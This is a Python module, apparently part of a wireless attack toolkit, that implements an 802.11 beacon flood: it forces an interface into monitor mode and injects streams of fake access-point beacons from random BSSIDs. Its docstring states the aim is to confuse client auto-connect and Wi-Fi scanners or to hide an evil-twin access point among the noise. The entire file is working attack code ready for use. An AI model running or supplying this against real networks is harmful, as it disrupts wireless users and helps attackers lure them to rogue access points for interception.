"""Beacon flood: broadcast fake APs to confuse client auto-connect / Wi-Fi
scanners, or mask a real evil twin among noise.

Each frame is a real, well-formed 802.11 beacon (frames.py's
craft_beacon()) from a random locally-administered BSSID -- no crypto or
association capability behind any of them, purely protocol-level noise.
Native from-scratch injection, following attacks/deauth.py's conventions
(monitor-mode self-heal, per-frame stop_event check, one socket.send()
per frame).
"""

from __future__ import annotations

import random
import string
import time

from scapy.config import conf

from ..frames import craft_beacon
from ..radio import (
    ensure_channel,
    ensure_monitor_mode,
    get_mode,
    random_locally_administered_mac,
)


def _random_ssid() -> str:
    """A plausible-looking fake SSID -- distinguishable as noise on close
    inspection (random suffix) but not an obviously synthetic string."""
    suffix = "".join(random.choices(string.digits, k=4))
    return f"Network-{suffix}"


def beacon_flood(
    iface: str,
    count: int = 100,
    ssids: list[str] | None = None,
    channel: int | None = None,
    interval: float = 0.05,
    progress_fn=None,
    stop_event=None,
) -> int:
    """Broadcast count fake beacons, each from a fresh random
    locally-administered BSSID.

    ssids: cycled through round-robin for each frame's advertised SSID;
    None (default) generates a fresh random-looking SSID per frame
    instead (see _random_ssid()).

    channel: the channel to broadcast on -- unlike deauth/CSA there's no
    real target AP to match, this is just where iface is parked while
    flooding. None leaves iface on its current channel.

    stop_event: checked before every frame; a set event aborts the
    remaining count immediately, same contract as attacks/deauth.py.

    Returns the number of frames actually handed to the OS for
    transmission -- 0 if iface isn't in monitor mode.
    """
    log = progress_fn or (lambda msg: None)

    mode = get_mode(iface)
    if mode != "monitor":
        ensure_monitor_mode(iface)
        mode = get_mode(iface)
        if mode == "monitor":
            log(f"{iface} had dropped out of monitor mode -- restored")

    if ensure_channel(iface, channel):
        log(f"channel set to {channel}")

    if mode != "monitor":
        log(f"WARNING: {iface} is in '{mode}' mode, not monitor -- beacon frames cannot transmit")
        return 0

    try:
        sock = conf.L2socket(iface=iface)
    except OSError as exc:
        log(f"beacon flood socket open failed: {exc}")
        return 0

    beacon_channel = channel or 1
    sent = 0
    try:
        for i in range(count):
            if stop_event is not None and stop_event.is_set():
                log(f"beacon flood stopped after {sent} frame(s) -- stop requested")
                return sent
            bssid = random_locally_administered_mac()
            ssid = ssids[i % len(ssids)] if ssids else _random_ssid()
            pkt = craft_beacon(bssid=bssid, ssid=ssid, channel=beacon_channel)
            try:
                sock.send(pkt)
                sent += 1
            except OSError as exc:
                log(f"beacon flood send failed after {sent} frame(s): {exc}")
                return sent
            log(f"fake beacon {i + 1}/{count} sent: bssid={bssid} ssid={ssid!r}")
            if interval and i < count - 1:
                time.sleep(interval)
    finally:
        sock.close()
    return sent
